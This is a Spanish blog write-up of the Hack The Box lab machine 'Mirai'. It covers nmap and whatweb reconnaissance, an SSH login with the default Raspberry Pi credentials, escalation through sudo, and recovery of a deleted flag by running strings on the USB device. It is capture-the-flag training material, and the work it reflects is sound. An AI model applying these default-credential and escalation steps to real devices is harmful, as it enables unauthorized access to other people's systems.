---
layout: single
title: Mirai - Hack The Box
excerpt: "Esta es una de las máquinas más sencillas que he hecho, pues no es mucho lo que tienes que hacer, aunque la investigación si me tomo algo de tiempo. Lo que haremos sera usar credenciales por defecto del SO Raspberry Pi para entrar al SSH y con esto obtener las flags, lo unico quiza dificil, es la forma de recuperar un .txt que fue eliminado."
date: 2023-03-06
classes: wide
header:
  teaser: /assets/images/htb-writeup-mirai/mirai_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Pi - hole
  - Raspberry Pi
  - Default Credentials
  - SUDO Exploitation
  - OSCP Style
---
![](/assets/images/htb-writeup-mirai/mirai_logo.png)
Esta es una de las máquinas más sencillas que he hecho, pues no es mucho lo que tienes que hacer, aunque la investigación si me tomo algo de tiempo. Lo que haremos sera usar credenciales por defecto del SO Raspberry Pi para entrar al SSH y con esto obtener las flags, lo unico quiza dificil, es la forma de recuperar un .txt que fue eliminado.


# Recopilación de Información
## Traza ICMP
Vamos a realizar un ping para saber si la máquina esta conectada y en base al TTL sabremos que SO usa la máquina.
```
ping -c 4 10.10.10.48                               
PING 10.10.10.48 (10.10.10.48) 56(84) bytes of data.
64 bytes from 10.10.10.48: icmp_seq=1 ttl=63 time=130 ms
64 bytes from 10.10.10.48: icmp_seq=2 ttl=63 time=131 ms
64 bytes from 10.10.10.48: icmp_seq=3 ttl=63 time=130 ms
64 bytes from 10.10.10.48: icmp_seq=4 ttl=63 time=130 ms

--- 10.10.10.48 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3001ms
rtt min/avg/max/mdev = 129.933/130.197/130.701/0.300 ms
```
Ahora sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.48 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:21 CST
Initiating SYN Stealth Scan at 11:21
Scanning 10.10.10.48 [65535 ports]
Discovered open port 22/tcp on 10.10.10.48
Discovered open port 80/tcp on 10.10.10.48
Discovered open port 53/tcp on 10.10.10.48
Completed SYN Stealth Scan at 11:22, 23.74s elapsed (65535 total ports)
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.41s latency).
Scanned at 2023-03-06 11:21:53 CST for 24s
Not shown: 35462 closed tcp ports (reset), 30070 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.86 seconds
           Raw packets sent: 114990 (5.060MB) | Rcvd: 35878 (1.435MB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Hay solamente 3 puertos abiertos, es curioso porque es similar a la máquina anterior que hicimos. Hagamos el escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p22,53,80 10.10.10.48 -oN targeted                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:23 CST
Nmap scan report for 10.10.10.48
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aaef5ce08e86978247ff4ae5401890c5 (DSA)
|   2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA)
|   256 b6a07838d0c810948b44b2eaa017422b (ECDSA)
|_  256 4d6840f720c4e552807a4438b8a2a752 (ED25519)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Bien, de momento no tenemos credenciales para el servicio SSH, así que vamos a ver directamente la página del puerto HTTP.

# Analisis de Vulnerabilidades
## Analizando Puerto 80
Vamo a entrar.

![](/assets/images/htb-writeup-mirai/Captura1.png)

A kbron...no hay nada, veamos que dice Wappalizer:

![](/assets/images/htb-writeup-mirai/Captura2.png)

No pues, no veo que eso nos ayude mucho, vamos a hacer dos cosas, una va a ser investigar el servidor web que usa la máquina y a usar la herramienta **Whatweb** para ver que información extra nos puede dar.

**lighttpd es un servidor web diseñado para ser rápido, seguro, flexible, y fiel a los estándares. Está optimizado para entornos donde la velocidad es muy importante, y por eso consume menos CPU y memoria RAM que otros servidores.**

Mmmm no nos sirve mucho esto, usemos **Whatweb**:
```
whatweb http://10.10.10.48/                                                                                         
http://10.10.10.48/ [404 Not Found] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.35], IP[10.10.10.48], UncommonHeaders[x-pi-hole], lighttpd[1.4.35]
```
Veo algo curioso **UncommonHeaders[x-pi-hole]**, investiguemos que es eso de **x-pi-hole**.

**Pi-hole es una aplicación para bloqueo de anuncios y rastreadores en Internet​​​​ a nivel de red en Linux que actúa como un sumidero de DNS​, destinado para su uso en una red privada.**

**Está diseñado para su uso en dispositivos embebidos con capacidad de red, como el Raspberry Pi pero también se puede utilizar en otras máquinas que ejecuten distribuciones Linux e implementaciones en la nube..**

Ok, entonces por lo que entiendo, nos estamos enfrentando a una máquina que usa un dispositivo llamado **Raspberry Pi**. Investiguemoslo.

**La Raspberry Pi es una computadora de bajo costo y con un tamaño compacto, del porte de una tarjeta de crédito, puede ser conectada a un monitor de computador o un TV, y usarse con un mouse y teclado estándar.**

Vaya, osea que es una mini computadora por asi decirlo. Además este aparato tiene un sistema operativo propio llamado **Raspberry Pi OS**, este SO esta hecho con Linux por lo que debe de tener claves por defecto que quiza podamos usar en el SSH. Busquemos:

https://www.makeuseof.com/tag/raspbian-default-password/

Según la página que encontre, el usuario y contreseña por defecto son:
* Usuario: pi
* Contraseña raspberry 

Vamos a probarlos directamente.

# Explotación de Vulnerabilidades
Intentemos entrar usando las credenciales por defecto de **Raspberry Pi**:
```
ssh pi@10.10.10.48                   
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ whoami
pi
```
?...Bueno ya que estamos dentro, busquemos alguna flag:
```
pi@raspberrypi:/home $ cd pi
pi@raspberrypi:~ $ ls
background.jpg  Desktop  Documents  Downloads  Music  oldconffiles  Pictures  Public  python_games  Templates  Videos
pi@raspberrypi:~ $ cd Public
pi@raspberrypi:~/Public $ ls
pi@raspberrypi:~/Public $ cd ../Desktop/
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
```
Ahi esta la flag del usuario.

# Post Explotación
Lo de siempre, veamos los permisos que tenemos:
```
pi@raspberrypi:~/Desktop $ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
```
Somos sudoers...entremos como root:
```
pi@raspberrypi:~/Desktop $ sudo su
root@raspberrypi:/home/pi/Desktop# whoami
root
```
Vaya que facil, bueno busquemos la flag donde siempre:
```
root@raspberrypi:/home/pi/Desktop# cd /root
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
```
Interesante, no tenemos la flag del root pero viene una pista de donde puede estar pero donde?

Por lo que se, en linux existe una carpeta llamada **Media** en donde se conecta el USB, vamos a esa carpeta:
```
root@raspberrypi:~# cd /media
root@raspberrypi:/media# ls
usbstick
```
Ahi esta! Veamos el interior:
```
root@raspberrypi:/media# cd usbstick/
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```
Me lleva el diablo James, debemos investigar como recuperar ese archivo.

Despues de investigar un rato, hay algo que podemos intentar, usaremos el comando strings para listar el contenido del usb. Para hacer esto primero debemos mostrar la información relativa al espacio total y disponible del sistema de archivos, esto lo hacemos con el comando **df**:
```
root@raspberrypi:/media/usbstick# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  34% /
tmpfs           100M  4.8M   96M   5% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     0  250M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           250M  8.0K  250M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           250M     0  250M   0% /sys/fs/cgroup
tmpfs           250M  8.0K  250M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            50M     0   50M   0% /run/user/999
tmpfs            50M     0   50M   0% /run/user/1000
```
Justamente ahi se ve en donde estamos, esa partición es la que vamos a analizar con el comando **strings**:
```
root@raspberrypi:/media/usbstick# strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
-----flag------
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```
Ahora si! Ya tenemos la flag del root.

## Links de Investigación
* https://es.wikipedia.org/wiki/Pi-hole
* https://raspberrypi.cl/que-es-raspberry/
* https://www.raspberrypi.com/software/
* https://www.makeuseof.com/tag/raspbian-default-password/
* https://thehackerway.com/2021/04/12/enumeracion-en-linux-para-post-explotacion-parte-4/
* https://marquesfernandes.com/es/tecnologia-es/como-recuperar-deleted-files-no-linux-ubuntu-debian/
* https://www.softzone.es/linux/programas/programas-recuperar-datos-eliminados-linux/
* https://tecnonautas.net/como-mostrar-los-caracteres-imprimibles-de-un-archivo-con-el-comando-strings/
* https://www.stackscale.com/es/blog/inodos-linux/

# FIN









